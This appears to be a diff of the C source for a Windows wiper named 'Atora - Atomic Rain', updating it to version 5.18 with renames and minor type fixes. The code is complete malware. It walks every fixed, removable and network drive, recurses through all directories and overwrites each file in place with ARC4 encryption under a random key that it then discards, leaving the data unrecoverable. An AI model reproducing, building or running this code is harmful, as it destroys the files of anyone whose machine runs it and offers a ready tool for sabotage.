@@ -1,29 +1,32 @@
 /*
   Name:             Atora - Atomic Rain.
-  Version:          4.91
+  Version:          5.18
   Class:            Files shredder for Windows / Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
+  SHA-256:          7d1795d687f7490567d5abdea6196e6ca44f7b470ea9e6f09e66561b657d3982
 */
-#include <windows.h>
-#include <stdio.h>
-#include <conio.h>
 #include <io.h>
+#include <time.h>
+#include <conio.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
 
 #define _ERROR        -1
 #define _ZERO          0
 #define _BYTE        256
 #define _BUFFER_SIZE 512
 
-void      ARC4(unsigned char * data, short int length);
+void      arc4(unsigned char * data, short int length);
 
-void      WriteTrash(unsigned char * data, short int  length);
-void      FindDir(unsigned char * path, unsigned char * mask);
-void      Initialized(unsigned char * key, short int length);
-void      swap (unsigned char * a, unsigned char * b);
-short int RandomRange(short int min, short int max);
-short int CheckLogicalDisk(short int number_disk);
-void      FileEncrypt (unsigned char * filename);
-void      GenerateKey(void);
+void      writetrash(unsigned char * data, short int  length);
+void      finddir(unsigned char * path, unsigned char * mask);
+void      initialized(const unsigned char * key, short int length);
+void      swap(unsigned char * a, unsigned char * b);
+short int randomrange(short int min, short int max);
+short int checklogicaldisk(unsigned char number_disk);
+void      fileencrypt(const unsigned char * filename);
+void      generatekey(void);
 
 char * expansion    = "*";
 char * slash        = "\\";
@@ -40,14 +43,15 @@ unsigned char data       [_BYTE]        = {_ZERO};
 
 int main (void) {
  short int i;
+ time_t real_time;
  char LOCAL_DISK[] = "+:";
  
- srand(time(_ZERO));
+ srand(time(&real_time));
 
  for (i = 65; i <= 90; i++) {
-  if (CheckLogicalDisk(i) == _ZERO) {
+  if (checklogicaldisk((unsigned char)i) == _ZERO) {
    LOCAL_DISK[_ZERO] = i;
-   FindDir(LOCAL_DISK, expansion);
+   finddir(LOCAL_DISK, expansion);
   }
  }
  
@@ -55,7 +59,7 @@ int main (void) {
  return _ZERO;
 }
 
-void FindDir(unsigned char * path, unsigned char * mask) {
+void finddir(unsigned char * path, unsigned char * mask) {
  WIN32_FIND_DATA wfd;
  HANDLE hfound;
 
@@ -75,8 +79,8 @@ void FindDir(unsigned char * path, unsigned char * mask) {
     strcpy(pathfile, path);
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
-    GenerateKey();
-    FileEncrypt(pathfile);
+    generatekey();
+    fileencrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
  }
@@ -92,43 +96,43 @@ void FindDir(unsigned char * path, unsigned char * mask) {
     strcpy(newpath, path);
     strcat(newpath, slash);
     strcat(newpath, wfd.cFileName);
-    FindDir(newpath, mask);
+    finddir(newpath, mask);
    }
   } while (FindNextFile(hfound, &wfd));
  }
  FindClose(hfound);
 }
 
-void GenerateKey(void) {
- WriteTrash(data, _BYTE);
- Initialized(data, _BYTE);
+void generatekey(void) {
+ writetrash(data, _BYTE);
+ initialized(data, _BYTE);
  memset(data, _ZERO, _BYTE);
 }
 
-short int CheckLogicalDisk(short int number_disk) {
+short int checklogicaldisk(unsigned char number_disk) {
  unsigned char LOGICAL_DISK[] = "+:\\";
  LOGICAL_DISK[_ZERO] = number_disk;
 
- unsigned char result = GetDriveType(&LOGICAL_DISK[_ZERO]);
+ short int result = (short int)GetDriveType(&LOGICAL_DISK[_ZERO]);
  
  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE) || (result == DRIVE_REMOVABLE))
   return _ZERO;
- else
-  return _ERROR;
+
+ return _ERROR;
 }
 
-short int RandomRange(short int min, short int max) {
+short int randomrange(short int min, short int max) {
  return min + rand() % ((max + 1) - min);
 }
 
-void WriteTrash(unsigned char * data, short int  length) {
+void writetrash(unsigned char * data, short int  length) {
  short int i;
 
   for (i = _ZERO; i < length; i++)
-   data[i] = RandomRange(_ZERO, _BYTE - 1);
+   data[i] = randomrange(_ZERO, _BYTE - 1);
 }
 
-void FileEncrypt (unsigned char * filename) {
+void fileencrypt(const unsigned char * filename) {
  FILE * f;
 
   if ((f = fopen(filename, "r+b")) != NULL) {
@@ -144,7 +148,7 @@ void FileEncrypt (unsigned char * filename) {
       while (position < fsize) {
        realread = fread(buffer, size_uc, _BUFFER_SIZE, f);
 
-       ARC4(buffer, realread);
+       arc4(buffer, realread);
 
        fseek(f, position, SEEK_SET);
        fwrite(buffer, size_uc, realread, f);
@@ -158,14 +162,14 @@ void FileEncrypt (unsigned char * filename) {
   }
 }
 
-void swap (unsigned char * a, unsigned char * b) {
+void swap(unsigned char * a, unsigned char * b) {
  unsigned char t = *a;
 
  *a = *b;
  *b = t;
 }
 
-void Initialized(unsigned char * key, short int length) {
+void initialized(const unsigned char * key, short int length) {
 
  for (vi = _ZERO; vi < _BYTE; vi++)
   secret_key[vi] = vi;
@@ -178,7 +182,7 @@ void Initialized(unsigned char * key, short int length) {
  vi = bi = _ZERO;
 }
 
-void ARC4(unsigned char * data, short int length) {
+void arc4(unsigned char * data, short int length) {
  register short int i;
   for (i = _ZERO; i < length; i++) {
    vi = (vi + 1) % _BYTE;
